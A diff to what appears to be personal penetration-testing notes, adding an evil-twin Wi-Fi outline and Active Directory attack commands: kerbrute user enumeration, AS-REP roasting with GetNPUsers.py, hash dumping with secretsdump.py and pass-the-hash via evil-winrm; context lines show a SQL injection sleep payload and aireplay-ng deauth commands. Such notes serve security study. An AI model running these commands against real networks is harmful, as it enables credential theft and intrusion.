@@ -47,7 +47,8 @@
   - [steps](#steps-1)
     - [getting packages](#getting-packages)
     - [weak IV traffic](#weak-iv-traffic)
-    - [creating key](#creating-key)
+    - [evil twin](#evil-twin)
+- [Active Directory](#active-directory)
 
 
 # Net Sec
@@ -524,5 +525,20 @@ admin123' UNION SELECT SLEEP(5),2;--
   - aireplay-ng --fakeauth 0 -a MAC wlan0mon -h MAC-host
   - aireplay-ng --deauth 0 -e "name" wlan0mon
   - 
-### creating key
-- 
+### evil twin
+- create fale access point (ap)
+- deauthenticate client
+- force clien to connect to fake ap
+
+# Active Directory
+- port 139/445
+- Enum4linux = Enumerate
+- kerbrute = brute force in kerberus active directory
+  - Find users
+    - kerbrute userenum -d domain --dc ip word_list.txt
+- Find user without password (NP)
+  - GetNPUsers.py --no-pass -usersfiles {wordlist.txt} domain.com/ -dc-ip [IP-address]
+- find other hashes
+  - secretsdump.py -dc-ip ip host.local/user@ip
+- Pass the hash
+  - evil-winrm -i IP -u USERNAME -H hash
